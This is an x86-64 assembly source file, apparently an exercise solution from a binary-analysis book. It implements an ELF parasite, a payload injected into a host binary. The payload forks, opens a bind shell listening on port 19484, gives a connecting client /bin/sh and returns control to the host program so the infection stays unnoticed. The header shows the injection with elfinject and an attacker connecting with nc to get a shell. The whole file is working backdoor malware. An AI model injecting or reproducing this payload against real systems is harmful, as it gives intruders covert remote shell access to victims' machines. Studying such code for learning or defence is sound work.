;---------------------------------+-----------------------------------------------+
; elf-parasite.s
;
; Written by Manuel Gebele (m.gebele‹ατ›tuta.io)
;
; Chapter 7, Exercise 3
;
; An implementation of a bind shell which opens up a communication port (listener)
; on the victim machine and waits for an incoming connection.
;
; Preconditions/Dependencies:
; - a compiled version of victim.c
;
; Sample session (victim machine):
; $ nasm -f bin -o elf-parasite.bin elf-parasite.s
; $ ./elfinject victim elf-parasite.bin ".parasite" 0x800000 0
; $ ./victim
; $ netstat -ap tcp | grep victim
; tcp        0      0 *:19484   *:*    LISTEN      8545/victim
; $
;
; Sample session (attacker machine):
; $ nc -nv 10.0.0.33 19484
; found 0 associations
; found 1 connections:
;     1:	flags=82<CONNECTED,PREFERRED>
;	        outif en0
;	        src 10.0.0.37 port 61034
;	        dst 10.0.0.33 port 19484
;	        rank info not available
;	        TCP aux info available
;
; Connection to 10.0.0.33 port 19484 [tcp/*] succeeded!
; whoami
; admin
; exit
; $
;---------------------------------+-----------------------------------------------+
; CODE LISTING                    | CODE COMMENT
;---------------------------------+-----------------------------------------------+
bits 64                           ; use 64-bit environment
;---------------------------------+-----------------------------------------------+
;---------------------------------+-----------------------------------------------+
section .text                     ; .text section
;---------------------------------+-----------------------------------------------+
entry:                            ; entry point
  mov rax, 57                     ; fork() syscall number
  syscall                         ; ............
  cmp rax, 0                      ; if (process == child)
  je socket                       ; true : prepare bind shell
                                  ; false: transfer control back to the host binary
  push 0x400470                   ; entry point address
  ret                             ; return
;---------------------------------+-----------------------------------------------+
socket:                           ; sockfd = socket(domain, type, protocol);
  mov rax, 41                     ; socket() syscall number
  mov rdi, 2                      ; domain = PF_INET
  mov rsi, 1                      ; type = SOCK_STREAM
  mov rdx, 0                      ; protocol = IP
  syscall                         ; ............
;---------------------------------+-----------------------------------------------+
bind:                             ; bind(sockfd, *addr, addrlen);
  mov rdi, rax                    ; sockfd = sockfd (file descriptor)
  mov rax, 49                     ; bind() syscall number
  lea rsi, [rel $+saddr_in-$]     ; addr = saddr_in
  mov rdx, saddr_in.len           ; addrlen = saddr_in.len
  syscall                         ; ............
;---------------------------------+-----------------------------------------------+
listen:                           ; listen(sockfd, backlog);
  mov rax, 50                     ; listen() syscall number
                                  ; sockfd = sockfd (unchanged)
  mov rsi, 1                      ; backlog = 1
  syscall                         ; ............
;---------------------------------+-----------------------------------------------+
accept:                           ; clientfd = accept(sockfd, *addr, *addrlen);
  mov rax, 43                     ; accept() syscall number
                                  ; sockfd = sockfd (unchanged)
  mov rsi, 0                      ; addr = NULL
  mov rdx, 0                      ; addrlen = NULL
  syscall                         ; ............
  push rax                        ; store clientfd
;---------------------------------+-----------------------------------------------+
close:                            ; close(fd);
  mov rax, 3                      ; close() syscall number
                                  ; fd = sockfd
  syscall                         ; ............
;---------------------------------+-----------------------------------------------+
  pop rdi                         ; restore clientfd
  mov rsi, 3                      ; newfd = 3
dup2:                             ; dup2(oldfd, newfd)
  mov rax, 33                     ; dup2() syscall number
                                  ; oldfd = clientfd
  dec rsi                         ; newfd = 2, 1, 0
  syscall                         ; ............
  loopnz dup2                     ; loop until newfd > 0
;---------------------------------+-----------------------------------------------+
execve:                           ; execve(filename, *argv[], *envp[])
  mov rax, 59                     ; execve() syscall number
  lea rdi, [rel $+shell_path-$]   ; filename = shell_path
  lea rsi, [rel $+victim_name-$]  ; rsi = victim_name
  push 0                          ; argv[1] = NULL
  push rsi                        ; argv[0] = victim_name 
  mov rsi, rsp                    ; argv = rsp
  mov rdx, 0                      ; envp = NULL
  syscall                         ; ............
;---------------------------------+-----------------------------------------------+
exit:                             ; exit(status) (just in case execve fails)
  mov rax, 60                     ; exit() syscall number
  mov rdi, 0                      ; status = 0
  syscall                         ; ............
;---------------------------------+-----------------------------------------------+
section .data                     ; .data section
;---------------------------------+-----------------------------------------------+
struc sockaddr_in                 ; describing an internet socket address
  .sin_family resw 1              ; family
  .sin_port   resw 1              ; port
  .sin_addr   resd 1              ; IP address
  .sin_zero   resb 8              ; padding
endstruc                          ; ............
saddr_in istruc sockaddr_in       ; ............
  at sockaddr_in.sin_family, dw 2 ; AF_INET
  at sockaddr_in.sin_port,   dw 0x1C4C ; port 19484 (little-endian)
  at sockaddr_in.sin_addr,   dd 0 ; localhost
  at sockaddr_in.sin_zero,   dd 0, 0 ; padding
iend                              ; ............
saddr_in.len equ $-saddr_in       ; saddr_in length
shell_path db '/bin/sh', 0x00     ; path to sh
victim_name db 'victim', 0x00     ; victim's process name
;---------------------------------+-----------------------------------------------+